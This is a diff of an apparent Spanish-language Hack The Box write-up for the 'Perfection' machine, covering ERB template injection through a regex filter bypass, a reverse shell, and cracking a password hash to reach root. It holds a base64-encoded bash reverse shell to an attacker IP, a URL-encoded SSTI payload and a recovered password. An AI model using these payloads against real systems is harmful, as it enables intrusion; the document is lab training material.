@@ -1,7 +1,7 @@
 ---
 title: Perfection
 description: Perfection es una máquina de Linux fácil que cuenta con una aplicación web con la funcionalidad de calcular las puntuaciones de los estudiantes. Esta aplicación es vulnerable a la Server-Side Template Injection (SSTI) a través de un bypass de filtro regex. Se puede obtener un acceso inicial explotando la vulnerabilidad SSTI. Al enumerar los usuarios se revela que son parte del grupo 'sudo'. Una mayor enumeración descubre una base de datos con hashes de contraseñas, y el correo del usuario revela un posible formato de contraseña. Usando un 'ataque de máscara' en el hash, se obtiene la contraseña del usuario, la cual se utiliza para obtener acceso 'root'.
-date: 2024-04-22
+date: 2024-05-23
 toc: true
 pin: true
 image:
@@ -41,6 +41,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![](/assets/img/htb-writeup-perfection/perfection4.png)
 
 Vulnerable a Server Side Template Injection.
+
 <https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection##erb-ruby>
 
 ![](/assets/img/htb-writeup-perfection/perfection5.png)
@@ -51,21 +52,25 @@ Creo el payload el base64.
 
 ```terminal
 -$ echo 'bash -c "bash -i >& /dev/tcp/10.10.16.65/4444 0>&1"' > payload.sh
+
 -$ cat payload.sh | base64 | xclip -sel clip
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg==
-
-%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>
 ```
+El payload quedaria de la siguiente manera '%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>'.
+
 ```terminal
 -$ nc -nlvp 4444
 	lisening on [any] 4444 ...
 ```
-![](/assets/img/htb-writeup-perfection/perfection8.png) ++++
+Luego de ponerme en escucha con 'Netcat', envio la peticion 'POST'.
+
+![](/assets/img/htb-writeup-perfection/perfection8.png)
 
 ```terminal
 	...connect to [10.10.16.65] from (UNKNOWN) [10.10.11.253] 35964
 
 python3 -c "import pty;pty.spawn('/bin/bash')"
+
 susan@perfection:~$ cat user.txt
 ```
 
@@ -75,6 +80,15 @@ susan@perfection:~$ cat user.txt
 
 ![](/assets/img/htb-writeup-perfection/perfection10.png)
 ![](/assets/img/htb-writeup-perfection/perfection11.png)
+
+Enumerando el sistema, encuentro dos archivos importantes: 'pupilpath_credentials.db', que contiene un hash que parece corresponder a una contraseña, y un correo con instrucciones para establecer el formato de una nueva contraseña.
+
+Con esta información, puedo reconstruir gran parte de la contraseña:
+```text
+{firstname}_{firstname backwards}_{randomly generated ineger between 1 and 1.000.000.000}
+   susan   _       nasus         _                   ?????????
+```
+Solo me restaría encontrar el número entre 1 y 1.000.000.000, lo cual es fácilmente descifrable conociendo el hash.
 
 ```terminal
 /home/kali/Documents/htb/machines/perfection:-$ echo 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f' > hash
@@ -90,7 +104,3 @@ sudo password for susan: susan_nasus_413759210
 
 root@perfection:/home/susan## cat /root/root.txt
 ```
----
-
-https://terminalintelligencesecurity.medium.com/perfection-is-a-sessional-hack-the-box-machine-and-its-a-linux-operating-system-with-a-web-96648a6a76e6
-https://dmolina23.github.io/posts/perfection-writeup-htb/
